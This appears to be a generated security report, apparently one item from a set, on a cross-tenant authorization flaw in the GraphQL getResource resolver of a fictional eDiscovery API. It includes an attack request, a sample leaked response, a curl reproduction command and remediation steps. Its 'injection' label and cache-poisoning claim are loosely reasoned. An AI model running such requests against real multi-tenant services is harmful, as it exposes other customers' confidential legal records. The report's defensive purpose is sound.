# Security Analysis Report
**System:** LexVault eDiscovery API
**Domain:** Legal Tech / Document Management
**Example ID:** GQL-0324
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Injection — Pattern 5.2 | Resolver/graph traversal injection via `getResource` — attacker traverses GraphQL resolver chain from own context into victim's privileged legal discovery records without re-authorization at each resolver level |

---

## Finding 1 — Injection: Resolver/Graph Traversal Injection (Pattern 5.2)

### Summary
The `getResource` resolver on LexVault eDiscovery API (`api.lexvault-ediscovery-.example.com`) fetches by `resourceId` only and does not verify the fetched record's `tenantId` against the JWT's `tenantId`. Per §5.0 Pattern 5.2, the resolver chain follows nested relationships without re-validating authorization at each level — an attacker with `tenant-472f` credentials resolves resource `R-2324` (belonging to `tenant-4da5`), and the resolver chain exposes `data.sensitiveField`, `data.internalNotes`, and nested fields without re-checking tenancy at any step in the traversal.

**Note:** HAR operation `getResource` matches response key `getResource` — these are consistent. No operation name inconsistency in this example.

**Redis cache vulnerability:** Cache is keyed by `resourceId` only (no tenant dimension), enabling cross-tenant cache poisoning of legal discovery documents.

**Pattern:** 5.2 — Resolver/graph traversal injection (Injection)
**Affected resolver:** `getResource` (and nested resolvers for `data`, `items`)
**Affected endpoint:** `POST https://api.lexvault-ediscovery-.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.lexvault-ediscovery-.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json
x-tenant-id: tenant-472f

{"query": "query VulnerableOp { getResource(id: \"R-2324\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}
```
Note: `x-request-id` is a **server-assigned response header**, not a request header.

**Response — Victim Legal Document Data Returned (cross-tenant)**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-4da5",
      "ownerId": "other-user-472f4da5",
      "data": {
        "sensitiveField": "CONFIDENTIAL-472f4da5",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
Attacker token: `tenant-472f`. Returned data belongs to: `tenant-4da5`. Cross-tenant legal document access confirmed. Resolver chain exposed `data.sensitiveField` and `data.internalNotes` without re-checking authorization at the nested resolver level.

### Steps to Reproduce
```bash
curl -s -X POST "https://api.lexvault-ediscovery-.example.com/graphql" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-472f" \
  -d '{"query": "query VulnerableOp { getResource(id: \"R-2324\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
# Vulnerable: response contains tenant-4da5 legal discovery data — cross-tenant graph traversal succeeded
# Secure: {"errors": [{"message": "Forbidden — tenant mismatch"}]}
```

### Remediation
1. In `getResource` resolver: after fetching the record, verify that `record.tenantId` matches `jwt.tenantId`. Return 403/null if mismatch.
2. Apply per-resolver authorization at every level in the nested resolver chain (`data`, `items`, `auditLog`) — do not rely on root resolver authorization alone.
3. Re-key Redis cache to include `tenantId`.
